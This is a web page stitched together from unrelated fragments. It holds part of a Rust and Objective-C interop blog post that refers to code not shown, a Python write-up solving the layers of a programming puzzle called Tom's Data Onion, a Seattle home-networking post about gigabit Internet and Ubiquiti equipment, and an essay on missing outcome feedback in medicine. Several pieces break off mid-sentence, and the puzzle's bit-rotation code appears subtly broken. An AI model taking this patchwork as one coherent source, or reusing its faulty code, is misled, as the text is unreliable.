<h2 id="objective-c-from-rust-manually">Objective-C from Rust, manually</h2>

<p>From this point on youâ€™ll be expected to read Rust syntax without step-by-step explanations. Iâ€™ll try to explain whatâ€™s going on for my Swift and other non-Rust readersâ€”I myself am still a relative newcomer to Rustâ€”but itâ€™ll be pretty fast. This is <em>not</em> intended to be an introduction to Rust or Rust macros!</p>

<p>Given that the Objective-C runtime exposes a public API, we should be able to pretty much just call that from Rust, and indeed we can:</p>

<p>Now, this code should make most Rust users pretty horrified. It starts out okay, declaring some types and then declaring the Rust versions of the C API from libobjc. Then itâ€™s got a funny empty extern block to link the Foundation framework, but sure, thatâ€™s fine. And itâ€™s got explicitly-null-terminated strings because thatâ€™s what C-based APIs generally use. (Rust doesnâ€™t guarantee null termination by default, which makes slicing a Rust string easier.)</p>

<p>But then thereâ€™s a monstrosity of a line involving <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html"><code>std::mem::transmute</code></a>, Rustâ€™s equivalent of Swiftâ€™s <code>unsafeBitCast(_:)</code> or C++â€™s <code>reinterpret_cast</code> (and now <a href="https://en.cppreference.com/w/cpp/numeric/bit_cast"><code>bit_cast</code></a>) or Câ€™sâ€¦well, okay, C doesnâ€™t have a direct equivalent, but a plain old cast when youâ€™re talking about function pointers like this. The <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html">docs for <code>transmute</code></a> even tell you to go use other things if possible.</p>

<p>So, what are we doing? Well, remember what I said about Objective-C and <code>objc_msgSend</code>: methods are regular C functions, and <code>objc_msgSend</code> â€œjumps directly to the appropriate, polymorphically-selected implementation of the methodâ€�. That means that the correct way to call <code>objc_msgSend</code> is to <em>pretend it has the right type for the method youâ€™re calling.</em></p>

<p>In C (and Swift, for that matter), that conversion would require explicitly specifying the type of all arguments and return values. But Rust has really powerful type inference within a function body, and that extends to specifying only <em>some</em> generic parameters, and leaving others out.<sup id="fnref:swift-inference" role="doc-noteref"><a href="#fn:swift-inference">2</a></sup> In this case I need to specify that weâ€™re casting to a C function pointer with two arguments and a non-void return, but not anything more than that. The remaining information will be filled in based on how the function pointer is used.</p>

<p>With that, you should understand the (cursed) code above. Go ahead. Try it on your own machine (if your machine is a Mac).</p>

<h2 id="recursive-rust-macros">Recursive Rust macros</h2>

<p>Rust has a pretty robust macro system, so it wouldnâ€™t be impossible or even too hard to make a macro for â€œmessage sendâ€�. Thatâ€™s the route that the <a href="https://crates.io/crates/objc"><code>objc</code> crate</a> takes:</p>

<div><pre><code><span></span><span>let</span><span> </span><span>url_class</span><span> </span><span>=</span><span> </span><span>class</span><span>!</span><span>(</span><span>NSURL</span><span>);</span><span></span>
<span>let</span><span> </span><span>description_obj</span>: <span>*</span><span>mut</span><span> </span><span>Object</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>url_class</span><span>,</span><span> </span><span>description</span><span>];</span><span></span>
<span>let</span><span> </span><span>utf8_ptr</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>description_obj</span><span>,</span><span> </span><span>UTF8String</span><span>];</span><span></span>
<span>println</span><span>!</span><span>(</span><span>"{}"</span><span>,</span><span> </span><span>CStr</span>::<span>from_ptr</span><span>(</span><span>utf8_ptr</span><span>).</span><span>to_string_lossy</span><span>());</span><span></span>
</code></pre></div>

<p>But while thatâ€™s clearly the right choice for serious Rust work, I wanted something more ambitious. More integrated. Moreâ€¦ridiculous.</p>

<blockquote data-dnt="true"><p lang="en" dir="ltr">wait a minute. this is just objective-c <a href="https://t.co/dVQMYKKVTI">pic.twitter.com/dVQMYKKVTI</a></p>— Harlan Haskins (@harlanhaskins) <a href="https://twitter.com/harlanhaskins/status/1133210047952015360?ref_src=twsrc%5Etfw">May 28, 2019</a></blockquote>


<p>What I wanted was for Objective-Câ€™s messaging syntax, or something like it, to be valid anywhere in Rust code. It didnâ€™t have to be exactly Objective-C, but I quickly realized the <em>advantage</em> of Objective-Câ€™s syntax: itâ€™s delimited, i.e. itâ€™s a self-contained expression that can be dropped into something larger without changing how that larger thing parses. (Thatâ€™s probably why itâ€™s bracketed in C as well.) Within the brackets, thereâ€™s basically two forms:</p>

<pre><code>[receiver-expr no-arg-selector]
[receiver-expr selector-piece:arg-expr selector-piece:second-arg-expr...]
</code></pre>

<p>If I were <em>just</em> matching that, I could use Rustâ€™s original <a href="https://doc.rust-lang.org/book/ch19-06-macros.html#declarative-macros-with-macro_rules-for-general-metaprogramming">pattern-matching macros</a>. But to take a whole block of code, and replace everything that looks like a message lock <em>in</em> that blockâ€¦well, it might be possible with pattern-matching and quite a bit of recursion, but itâ€™s going to be a lot easier to use <em><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">procedural macros</a>,</em> a Rust macro interface written in Rust and used as a compiler plugin. (Swift folks, basically what <a href="https://github.com/apple/swift-syntax">SwiftSyntax</a> allows you to do, but invoked on-demand during compilation.)</p>

<p>A couple of months ago I came across a programming puzzle called
<a href="https://www.tomdalling.com/toms-data-onion/">Tom’s Data Onion</a>.</p>

<p>The puzzle looked interesting because solving one layer of the puzzle
lets you access further layers, for a total of 6 puzzles.</p>

<p>This write up will cover solving version 1.0 (released 2020-06-11)
and version 1.1.3 (released 2020-08-06) of the puzzles using python.</p>



<p>Each puzzle shares the follow qualities:</p>

<ul>
<li><p>They all have a marked <code>==[ Payload ]====...</code> section where the
puzzle data is stored.</p></li>

<li><p>The puzzle data is always encoded using Adobe ASCII85.</p></li>
</ul>

<p>For that reason, I created common functions to extract and decode that
section:</p>

<pre><code>def extract_payload(data: str) -&gt; str:
    # The payload is bound by `&lt;~` and `~&gt;`
    start = '&lt;~'
    end = '~&gt;'
    # Match all characters or linebreaks.
    match = re.search(f'{start}(.|\n)*{end}', data, re.MULTILINE)
    if match:
        found = match.group(0)
    else:
        raise Exception("No payload.")
    return found

def read_current(idx: int) -&gt; str:
    path = pathlib.Path(__file__).parent / f'stage-{idx}.txt'
    with open(path, 'r') as f:
        data = f.read()
    encoded = extract_payload(data)
    decoded = base64.a85decode(encoded, adobe=True)
    return decoded
</code></pre>

<h2 id="layer-0">Layer 0</h2>

<p>Layer 0 is the most straightforward. The payload is encoded ASCII85.
Decoding it gives us the next layer without any further processing
needed.</p>

<h2 id="layer-1">Layer 1</h2>

<p>Layer 1 requires us to iterate over the payload byte by byte and
perform the following bit operations on it:</p>

<blockquote>
<p>Flip every second bit<br>
Rotate the bits one position to the right</p>
</blockquote>

<p>This function will take care of that:</p>

<pre><code>def stage_1(decoded: str) -&gt; str:
    flip_mask = 0x55
    output = ''

    for b in decoded:
        # 1. Flip every second bit (high to low).
        # 2. Rotate the bits one position to the right, fill the
        # highest with the lowest bit as a result of the rotation.
        flipped = b ^ flip_mask
        shifted = flipped &gt;&gt; 0x1
        # Put the lowest order bit back into the highest spot.
        shifted |= ((flipped &amp; 0x1) &lt;&lt; 0x8)
        # Each byte should be convertible to an ascii character.
        output += chr(shifted)
    return output
</code></pre>

<h2 id="layer-2">Layer 2</h2>

<p>This layer is slightly more complicated. It requires us to once again
iterate over the data and do bit operations. This time, the data
contains some metadata in the form of a parity bit. We need to check
the parity bit and discard any data that doesn’t pass the check.
Here is how we know:</p>

<blockquote>
<p>To determine if the parity bit is correct, first count how<br>
many 1 bits exist within the seven data bits. If the count<br>
is odd, the parity bit should be 1. If the count is even,<br>
the parity bit should be 0.</p>
</blockquote>

<p>To solve this, I iterated over all the bytes, then within each byte
iterated over each bit and summed them. It was then possible to check
the parity bit:</p>

<pre><code>bits = []

for b in decoded:
    # Lowest order bit is a parity bit. If the count of the
    # seven highest bits is even, parity bit is 0. If the count
    # is odd, parity bit is 1. Discard bytes with an incorrect
    # parity bit.
    bit_sum = 0
    candidate_bits = []

    for bit_idx in range(0x7, 0x0, -0x1):
        # High to low bit, ignoring the parity bit.
        bit = (b &amp; (0x1 &lt;&lt; bit_idx)) &gt;&gt; bit_idx
        bit_sum += bit
        candidate_bits.append(bit)

    parity_bit = b &amp; 0x1
    expected_parity = 0x0 if bit_sum % 2 == 0 else 0x1
    if parity_bit == expected_parity:
        bits.extend(candidate_bits)
</code></pre>

<p>If the check passed, I kept the non-parity bits (i.e. our data) in its
own buffer (<code>bits</code>). This was then used to generate the next payload:</p>

<pre><code>output = ''
# https://stackoverflow.com/a/32284957
for i in range(0, len(bits), 8):
    output += chr(int("".join(map(str, bits[i:i + 8])), 2))
</code></pre>

<p>There is probably a cleaner way to do this, but it worked just fine.</p>

<h2 id="layer-3">Layer 3</h2>

<p>I thought this was the most fun puzzle, even if it wasn’t the hardest
one. This stage involves XOR encryption using a cycling key:</p>

<blockquote>
<p>The payload has been encrypted by XOR’ing each byte with a<br>
secret, cycling key. The key is 32 bytes of random data,<br>
which I’m not going to give you. You will need to use your<br>
hacker skills to discover what the key is, in order to<br>
decrypt the payload.</p>
</blockquote>

<p>If you do some research on this form of encryption, you’ll quickly find
out that it can be beat with frequency analysis. However, we can keep
things even simpler because we already have a sense of what the decrypted
data looks like.</p>

<p>For example, each puzzle so far has had a predictable header that looks
like this:</p>

<pre><code>==[ Layer N/5: PUZZLE_NAME ]=============================
</code></pre>

<p>For this exercise, we know that it’ll be named <code>==[ Layer 4/5:</code> to begin
with. We don’t know the name of the puzzle yet. We also know that it will
end in some number of <code>=</code> characters and two line breaks (<code>\n\n</code>).</p>

<p>We can recover part of the key by XORing what we think the original
value is with the ciphered values:</p>

<pre><code>_REMAINDER = '=============================\n\n'

def _analyze_known_value(ciphered: str) -&gt; None:
    title_end_xor = ciphered[32:64]
    partial_key = []
    for r1, r2 in zip(_REMAINDER, title_end_xor):
        k = ord(r1) ^ r2
        partial_key.append(k)
</code></pre>

<p>We can then apply what we’ve found to the first chunk of the title,
bytes 0-32 and get a partial title:</p>

<pre><code>==[ Layer 4/5: Network Traff^c}
</code></pre>

<p>Now that we found the unknown name of the puzzle (<code>Network Traffic</code>),
we can recovery entire key by once again XORing what we think the
original text was with the ciphered text:</p>

<pre><code>_TITLE = '==[ Layer 4/5: Network Traffic ]'

def _extract_key(ciphered: str) -&gt; list:
    key = []
    title_xor = ciphered[0:32]
    for t1, t2 in zip(_TITLE, title_xor):
        k = ord(t1) ^ t2
        key.append(k)
    return key
</code></pre>

<h2 id="layer-4">Layer 4</h2>

<p>This layer’s data comes in the form of good and bad UDP packets.
To get the next payload, we have to remove any UDP packets whose:</p>

<ul>
<li>FROM address isn’t 10.1.1.10</li>
<li>TO port isn’t 42069</li>
<li>TO address isn’t 10.1.1.200</li>
<li>IPv4 and UDP header checksums fail</li>
</ul>

<p>We can use the following resources to implement these checks:</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/IPv4_header_checksum#Verifying_the_IPv4_header_checksum">Verify the IPv4 header checksum</a></li>
<li><a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol#UDP_datagram_structure">Check the source and destination ports and addresses</a></li>
<li><a href="https://stackoverflow.com/questions/45908909/my-udp-checksum-calculation-gives-wrong-results-every-time/45925573#45925573">Verify the UDP header checksum</a></li>
<li><a href="https://www.securitynik.com/2015/08/calculating-udp-checksum-with-taste-of.html">Test the UDP header checksum verification</a></li>
</ul>

<p>If all of the above is implemented correctly, we should get the right
data. The source code to solve this isn’t included inline because it’s
too long. Instead, it’s available at the end.</p>

<h2 id="layer-5">Layer 5</h2>

<p>This stage’s data is encrypted using AES-256 in CBC mode. We are given
the key and the initialization vector. However, the key itself is also
encrypted using AES key wrap, which itself has a decryption key called
a key encrypting key (KEK).</p>

<p>Implementing the decryption and key unwrapping manually would be too much
of a pain. Thankfully, the <a href="https://pypi.org/project/aes-keywrap/"><code>aes-keywrap</code></a>
package will do that work for us. The AES decryption is then handled using
<code>AES</code> from <code>Crypto.Cipher</code>. Because most of this is handled by 3rd party
code, the solution is pretty short:</p>

<pre><code>import struct

from Crypto.Cipher import AES
from aes_keywrap import aes_unwrap_key


def handle_encrypted_data(decoded: str) -&gt; str:
    key_encrypting_key = decoded[0:32]
    wrapped_key_iv = struct.unpack('&gt;Q', decoded[32:40])[0]
    wrapped_key = decoded[40:80]
    payload_iv = decoded[80:96]
    payload = decoded[96:]

    unwrapped_key = aes_unwrap_key(
        key_encrypting_key,
        wrapped_key,
        iv=wrapped_key_iv
    )

    cipher = AES.new(unwrapped_key, AES.MODE_CBC, payload_iv)
    decrypted = cipher.decrypt(payload)
    return decrypted.decode('ascii')
</code></pre>

<h2 id="version-1-1-3">Version 1.1.3</h2>

<p>There are three differences between this version and version 1.0.</p>

<p>First, on layer 3, our known value no longer starts like this:</p>

<pre><code>==[ Layer 4/5:
</code></pre>

<p>Because a new layer was added we now need to update it to this:</p>

<pre><code>==[ Layer 4/6:
</code></pre>

<p>Second, on layer 5, we need to update the encryption mode since it
now uses CTR instead of CBC. Here is a contrast between the versions
to show the impact on the code:</p>

<pre><code>cipher = AES.new(unwrapped_key, AES.MODE_CBC, payload_iv)
</code></pre>

<pre><code>counter_obj = Counter.new(
    128,
    initial_value=int.from_bytes(payload_iv, byteorder='big'),
    little_endian=False
)

# unwrapped_key and payload_iv can be used to decrypt the
# rest of the payload.
cipher = AES.new(
    unwrapped_key,
    mode=AES.MODE_CTR,
    counter=counter_obj
)
</code></pre>

<p>Third, a 6th layer has been added before we reach the end. The next
section provides the solution.</p>

<h2 id="layer-6">Layer 6</h2>

<p>This layer’s data comes in the form of custom machine code that we need
to write an emulator or virtual machine to execute. If we run it correctly,
then it will output the last layer (i.e. the result of the puzzle).</p>

<p>Like layer 4, the source code isn’t included in line because it’s too
long. However, there are a few interesting qualities I want to call out.</p>

<p>For starters, the entire “memory” content is the code we’re executing. It is
also fully readable, writable, and executable. In theory this means that the
code could overwrite pieces of itself as it’s executing (i.e. it could be
polymorphic). I’m not sure if this happens in practice, but it’s an interesting
detail.</p>

<p>On top of that, the program counter register (<code>pc</code>) is directly mutable. There
was a gotcha here because after executing an instruction, we need to increment
the <code>pc</code> register to find the next instruction. Each opcode is 1 byte,
but some are immediate mode and contain their data in line. For example,
moving a value into <code>pc</code> looks like this:</p>

<pre><code>B0 29 00 00 00  # MVI32 pc &lt;- 0x00000029
</code></pre>

<p>As a result, I thought after doing this operation I would need to increment <code>pc</code>
by 5 bytes to get to the next instruction. This was a bug, because we already
overwrote <code>pc</code> and thus have its next value without also incrementing it.</p>

<p>A final detail to call out was this pseudo-register:</p>

<blockquote>
<p><code>(ptr+c)</code>  Memory cursor – Used to access one byte of<br>
              …</p></blockquote></div></section></article></div></div>

            <p>WiFi that just works with multiple mounted access points. Symmetric 1000 Mbps 
symmetric gigabit Internet. Centrally managed enterprise network gear. Pulling 
new CAT6 while dealing with old CAT3 in a condo.</p>

<p>This is my story, long overdue, about some of the experiences, challenges, and 
information about the connectivity tech I enjoyed at home. I love not having to 
worry about my WiFi ever having issues, even in the dense city, thanks to 
enterprise-grade gear.</p>

<p>In Seattle we’re lucky to have broad access in apartments/condominiums to
gigabit Internet from providers such as 
<a href="https://waveg.wavebroadband.com/">Wave G</a> (a.k.a. CondoInternet). Having a 
zippy connection without bandwidth caps means that I’m free to stream 4K content,
backup my on-premise storage to the cloud, and not worry about keeping 
operating system installation disc images around.</p>

<p>My building’s gigabit is provided by a 10G fiber link to a data center just a 
few blocks away, which then has its own 40G link to classic peering location in
Seattle - . Our rooftop also has several 60GHz millimeter wave radio links, 
available either as backup or to serve nearby buildings. In this post 
I wanted to share how that infrastructure is deployed in my condo building.</p>

<p>With fiber to our building there are minimal hops between major cloud 
providers and big networks thanks to the many peering opportunities in downtown
Seattle. The 
<a href="https://www.westinbldg.com/">Westin Building Exchange</a> carrier hotel/colo is 
home to the important non-profit 
<a href="https://www.seattleix.net/">Seattle Internet Exchange</a>, moving terabits per second, 
with a transparent approach that lets you peek at their stats, story and customers.</p>

<p>Having fast Internet creates pressure to be able to move a lot of packets to 
take advantage of the speed, and that’s where enterprise-grade managed network
equipment comes in. There’s a lot of value in the data and featureset of the 
UniFi line from <a href="https://www.ubnt.com/">Ubiquiti Networks</a> when it comes to 
routing, switching, and access points.</p>

<p>I’ve been running a Ubiquiti network at home for over 2 years and have been very
happy with that investment.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/post-collage.jpg" title="From left-to-right: UniFi security gateway pro, PoE switch, and other rack gear; a screenshot of the deep packet inspection features of the UniFi Controller; an access point glowing; screenshot of my 2G RF environment; picture of one of the intermediate distribution frame (IDF) near my unit"></p>

<p>Finally, I wanted to document some of the challenges with old CAT3 and 
pulling new pulling CAT6 within the constraints of my condo building, mostly to
share my pain.</p>

<p>Apologies in advance, this post is full of up-optimized images and is much too
long.</p>

<p><small>Disclaimer:<br>
I’m a tech enthusiast in this space but don’t represent any of the companies 
mentioned. While my initial Ubiquiti buildout in Feb. 2016 was my own, in 
Dec. 2017 I was provided a demo AC-HD access point to evaluate. 
I’ve since purchased my own AC-HD.</small></p>

<p><strong>4/15/18 update:<br>
Through follow-up conversations on Twitter following this post, I discovered 
something amazing: our building was originally provided Internet through 
millimeter wave, and still has it as a backup and to provide coverage to other 
nearby buildings, but our building is actually connected directly through a 
10 Gigabit fiber link. Cool!
</strong></p>

<p><strong>4/16/18 update:<br>
Wave G (Spectrum and family) actually has at least 1x 100 Gbit fiber connection 
to the SIX, soon to have a second.
</strong></p>

<!-- ---------------- WAVE G ---------------- -->



<p>Even today, I remember a conversation with my friend Alex a decade ago when 
15 Mbps down, 2 Mbps up cable Internet was a common offering from Comcast and 
competitors, and if you used DSL, it’d be even slower.</p>

  <p>Alex (in 2008): “My apartment building just got CondoInternet. 100 Mbps up and down, no caps or contracts.”</p>

  <p>Jeff: “That’s hard to believe, that’s like what I had in my university dorm room, but no commercial providers offer that sort of speed. There must be caps or something. It can’t be  that fast!”</p>

  <p>Alex: “It’s true, and I hear you can also get a 1000 Mbps connection. This is the future.”</p>
</blockquote>

<p>Alex was right, I was wrong. 
If you live in an apartment or condo in Seattle, chances are you’re reading this 
via your <a href="https://waveg.wavebroadband.com/">Wave G</a> connection, but for those 
that are not familiar with the service, this is a primer.</p>

<p>Wave G, formerly known as CondoInternet before being acquired by the Wave 
conglomerate, was founded a decade ago by techies who ran their own wholesale 
bandwidth business and wanted to have fast Internet at home in their condos.</p>

<p>Today, the Wave G gigabit product is the gold standard for everyone from tech 
employees working from home to being the best ISP in town to stream content with.
It’s basically the opposite of Comcast: no contracts, no upward pricing pressure,
quick service, no cable modem required, no bundling.</p>

<p>If your multi-family building is connected to Wave G (hundreds are), often you
only need to make a phone call and patch your unit’s home run network cable 
to your router or computer.</p>

<p>From the home run, a nearby comms closet holds Wave G’s managed switch equipment,
at which point you’re on their network: fiber from our building runs to a 
nearby data center, then Seattle’s central peering fiber hotel.</p>

<h2 id="locations">Locations</h2>

<p>Wave G is available today in several cities in Western Washington including 
Seattle, Bellevue and Everett; Portland, Oregon; and in California, Roseville 
and then San Francisco all the way to San Jose.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/wave-locator.png" title="A screenshot of the Wave G service locator"></p>

<p>There’s some competition, too - while Wave acquired a previous similar company,
Cascadelink, Google Fiber’s Webpass is available in the neighborhood,
and I’m seeing more expansion there. Wave was recently purchased by a 
leveraged buyout and investment firm, TPG Capital, and I’m interesting to see 
what happens to the service. Hopefully no change.</p>

<h2 id="pricing">Pricing</h2>

<p>If you pay for gigabit, Wave G configures your switch port for full duplex 
1000 Mbps negotiation; otherwise your link will negotiate to 100 Mbps.</p>

<p>The pricing as far as I can remember has been $60/month for 100 Mbps 
or $80/month for 1000 Mbps. A few years ago gigabit was double the price of the 
hundred megs, so there was a price reduction.</p>

<h2 id="most-of-the-web-is-slow">Most of the web is slow…</h2>

<p>While you can stream 4K content just fine without buffering, or download an OS 
image in seconds, at home you don’t really need a gigabit connection for most 
daily web tasks (yet).</p>

<p>While just under 1000 Mbps is the theoretical gigabit maximum, most web sites 
and cloud services aren’t going to be able to make full use of your connection 
in a sustained manner. Large files hosted on CDNs should be quick at least:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/quick-windows-download.png" title="At least you can download Windows and Linux ISO images in a few minutes"></p>

<p>Having gigabit at least feels like a key requirement to experiment with 4K
content, keeping all your storage in the cloud, VR, and other up-and-coming 
advancements.</p>

<h2 id="wave-gs-network">Wave G’s network</h2>

<p>Once your home is connected to Wave G’s network, they have their own 
efficient gear that connects to their fiber, eventually peering with 
others inside data centers and nearby colo facilities like the 
<a href="https://www.westinbldg.com/">Westin Building Exchange (WBX)</a> and the 
<a href="https://www.seattleix.net/">Seattle Internet Exchange (SIX)</a>,
providing short hops and low latency. Buildings near ours connect to the 
10 Gbit fiber backhaul our building has underground using millimeter wave 
radios on the roof of our building.</p>

<p>This is where the original Condo Internet company took advantage of their
parent company, Spectrum Networks, and their wholesale bandwidth offerings and
connectivity.</p>

<p>From my home network, my CAT6 networked machines get sub-millisecond - to - 1ms
ping times to Google, Microsoft, and all the major modern Internet services, just 
a few hops away…</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/waveg-ping-times.png" title=""></p>

<h2 id="890-940-mbps-typical-test-speeds">890-940 Mbps typical test speeds</h2>

<p>Testing with <a href="http://www.speedtest.net/">SpeedTest.net</a> I’ll usually see 
download speeds between 850-950 Mbps depending on the test site selected, and 
interestingly, my upload speeds are usually measured consistently around 950 Mbps.</p>

<p>In my home, only wired equipment experiences the full potential of this
connectivity, since WiFi is very dense in my neighborhood - lots of interference 
means that devices individually often connect at a slower line rate.</p>

<p>According to Netflix’s <a href="https://fast.com/">fast.com</a>, when I recently checked, 
my connection was approximated to 920 Mbps. Fast.com does a nice job of 
estimating various data sources to find a number that represents how your 
Netflix experience should be.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/netflix-fast.png" title="According to Netflix fast.com, the connection speed is approximately 920 Mbps."></p>

<h2 id="fiber-backbone">Fiber backbone</h2>

<p>While many buildings in Wave G’s network are connected by millimeter wave 
rooftop connections, our building has a 10G fiber connection. Our building also
has rooftop millimeter wave dishes to serve other nearby buildings that do not
have fiber runs.</p>

<p>If you look out from our tower’s roof toward Elliott Bay, you can see a few of
the other nearby buildings that we connect to:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/other-buildings.jpg" title="A look toward Elliott Bay, highlighting microwave Internet rooftop connections as part of the neighborhood mesh network."></p>

<p>Turning around and facing downtown Seattle, looking across the Belltown
neighborhood, there are many rooftop sites, likely all part of the Wave G
network:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/other-buildings2.jpg" title="Looking across the Belltown neighborhood, nearly every rooftop has microwave backhaul equipment."></p>

<p>Our roof has 6+ <a href="https://bridgewave.com/bw64/">BridgeWave 60GHz millimeter wave radios</a>.
Each of these antennas provides a 1 Gbps full-duplex encrypted link between locations,
essentially a large private mesh network.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/rooftop-microwaves.jpg" title="Rooftop 60GHz microwave backhaul equipment."></p>

<p>In our building’s garage basement, that network connects to the 10 Gigabit 
backbone network that Spectrum networks and Wave G runs.</p>

<h2 id="static-ipv4-ipv6-blocks">Static IPv4, IPv6 blocks</h2>

<p>I don’t actually know the latest on this story (whether it’s a monthly or a
one-time charge now), but when I requested my static IP years ago, it was a one-time 
$15 fee for a static static IPv4 address, and now I also have my own IPv6 block.</p>

<p>When moving between buildings and units, I’ve needed to get a new static IP 
address, but have been happy with the great support experience in requesting 
those changes and coordinating my moves.</p>

<h2 id="great-tech-support">Great tech support</h2>

<p>I’ve never experienced a large outage, but when I was first setting up my
connection, due to the CAT3 wiring to my unit, I was only able to get 100 Mbps
connection to the carrier switch.</p>

<p>Wave G’s primary equipment has commercial UPS units present, and the switching
gear throughout the building runs off of the emergency generator circuit in
our building.</p>

<p>When I first moved to my condo, I had a tech come out to help me look into why 
I was only able to get a 100 Mbps connection, and in the end I learned a lot
about CAT3 and the heavy signal degradation I was experiencing. (More about my
CAT3 woes later in this post)</p>

<p>The tech even came out with a box of CAT5e cable in case we wanted to pull a new</p></div></div>

<p>By DAVID SHAYWITZ, MD</p>



<p>Medicine is plagued by a feedback gap, or perhaps more accurately, a feedback paradox.&nbsp;</p>



<p>On the one hand, clinicians are bombarded by feedback. Every day, there are a slew of process and billing metrics to review, providing an accounting of the volume of patients seen, and the intensity of each visit.&nbsp;</p>



<p>How thorough was the exam? What procedures may have been performed?&nbsp;</p>



<p>Even beyond the measures related to billing are an ever-growing number of measures related to guideline adherence. Doctors have an increasingly long set of questions to answer, boxes to check.</p>



<p>Did you ask about seatbelts use? Did you ask about home safety? Have you scheduled an eye exam for your patient with diabetes? These are often, individually, sensible and relevant considerations. In aggregate, however, they can be overwhelming and lead to guidance fatigue and ethical slippage, as Bill Gardner (<a href="http://theincidentaleconomist.com/wordpress/the-burden-of-checklists-and-the-importance-of-core-metrics/">here</a>) and Drs. David Blumenthal and J. Michael McGinnis (<a href="https://jamanetwork.com/journals/jama/article-abstract/2288464">here</a>) have discussed, and as I recently <a href="https://thebulwark.com/beware-of-guidance-fatigue/">reviewed</a> in the context of COVID-19.</p>



<p>Yet for all these metrics and assessments, what’s often lacking is any sense of how the patients are actually faring – the thing that matters most.&nbsp;</p>



<p>It’s not at all clear whether all the carefully documented and billed work is leading to improved outcomes for patients. Are there approaches for some patients that are leading to better outcomes than other approaches, and which could be generalized?&nbsp; Are there other approaches that should be abandoned?</p>



<p>The heart of the problem is how most clinical research is done. On the one hand, to demonstrate, scientifically, that a particular approach (whether a novel drug or a new approach to therapy, like <a href="https://www.thelancet.com/journals/lanres/article/PIIS2213-2600(20)30268-X/fulltext">placing sick COVID-19 patients on their stomachs</a> instead of their backs when they’re in the hospital) works, a clinical trial – ideally, a randomized, double-blind, placebo-controlled, to the extent possible – is performed. This is a highly choreographed exercise, where the exact characteristics of the subjects to be enrolled, the evaluations to be performed, and the criteria for success are all spelled out, clearly, in advance (or at least, ought to be). Enrolled subjects are tracked meticulously, and ultimately, you should be able to determine if the intervention was more effective than your control at achieving the pre-specified outcomes.&nbsp;</p>



<p>This is the way medical science advances – through rigorous clinical studies, and then the adoption of these results in clinical practice.</p>



<p>The <a href="https://ascpt.onlinelibrary.wiley.com/doi/10.1002/cpt.1382">conceit</a> of this approach is that the results from a rigorous clinical study will be widely generalizable, meaning that the patient you’re treating will respond like the subjects in the study, and the treatment you’re providing will mirror that offered in the study. &nbsp;</p>



<p>Of course, we all know side effects can emerge over time that weren’t seen in clinical trials, and we recognize that certain groups – women and minorities in particular – have historically been underrepresented in clinical trial populations. &nbsp;</p>



<p>To the extent that you accept the basic premise that a well-run clinical trial yields results that can guide care, then it makes sense for health systems to impose processes that try to ensure patients with a particular condition receive the treatment indicated by clinical trials.&nbsp;&nbsp;</p>



<p>This approach has given rise to the idea of “disease pathways,” that provide a &nbsp;template for managing patients with a particular condition, and the embrace of &nbsp;process metrics, that try to ensure doctors are following the updated guidance – rather than, say, doing what perhaps they’ve always done because it’s what they know.</p>



<p>In practice, there are two problems with this system: one stemming from doctors who disregard these pathways, the other related to doctors who adhere to them.</p>



<p>Many physicians (perhaps especially in august academic institutions) worry most about their colleagues, especially those who practice in the community.&nbsp;</p>



<p>These physicians are often presumed by their university colleagues to be less attuned to the latest scientific literature, and hence neither of relevant advances in care nor practicing in a setting that encourages them to do so. Consequently, their patients may not be receiving the most optimal care, and have no way of knowing it.</p>



<p>But a second category of challenge involves the physicians who are attuned to guidelines, perhaps because they closely follow the literature, or perhaps because their health system nudges them to adhere. While arguably the patients in the care of these physicians are on balance better off than those in the first group, there are still important challenges – and embedded opportunities.</p>



<p>For starters, subjects in clinical studies are notoriously unrepresentative of the more general population – enrolled subjects tend to be healthier and to have fewer co-existing conditions, in effort to enable a clearer evaluation of the intervention, and provide a sort of “best case” read-out.</p>



<p>In addition, subjects in trials tend to be followed unusually closely – they may be reminded to take their medicine, for example, and encouraged along the way by study staff.&nbsp; While inclusion of a placebo group controls for the therapeutic impact of the extra attention (known as the “Hawthorne Effect”), it doesn’t account for the combined effect of experimental intervention plus attention – the increased likelihood that a subject in a study will reliably take a given medicine, say, compared to a patient in a doctor’s office, where the <a href="https://www.nytimes.com/2002/07/16/health/improved-drug-regimens-help-patients-take-their-medicine.html">medication adherence rate</a> can be astonishingly low. (It’s also why tech-enabled health service companies that feature a strong coaching and tracking component, <a href="https://www.forbes.com/sites/davidshaywitz/2017/03/08/can-silicon-valley-cure-diabetes-with-low-carbs-and-high-tech/#2e86110f190a">like Omada and Virta</a>, have gained considerable traction.)</p>



<p>As UCSF’s Dr. Fred Kleinsinger <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6045499/">noted</a> in a 2018 publication:</p>



<p>“Medication nonadherence for patients with chronic diseases is extremely common, affecting as many as 40% to 50% of patients who are prescribed medications for management of chronic conditions such as diabetes or hypertension. This nonadherence to prescribed treatment is thought to cause at least 100,000 preventable deaths and $100 billion in preventable medical costs per year.”</p>



<p>Finally, some patients in clinical practice may actually respond better than expected to a particular intervention – perhaps because of an intrinsic characteristic (involving their genetics or their microbiome, for example), or perhaps because of something subtle a particular physician or care provider did, a tweak that might goose the patient along a little bit. These are opportunities to learn from “happy accidents,” to institutionalize serendipity, so to speak, and benefit from the ingenuity of inquisitive physicians (medicine’s <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6617976/">lead users</a>, to use von Hippel’s term) –opportunities that are easily missed in the course of routine care.</p>



<p>The common feature of all these clinical care scenarios is the almost complete absence of tracking the one thing that matters most – actual patient outcomes over the long term.&nbsp;&nbsp;</p>



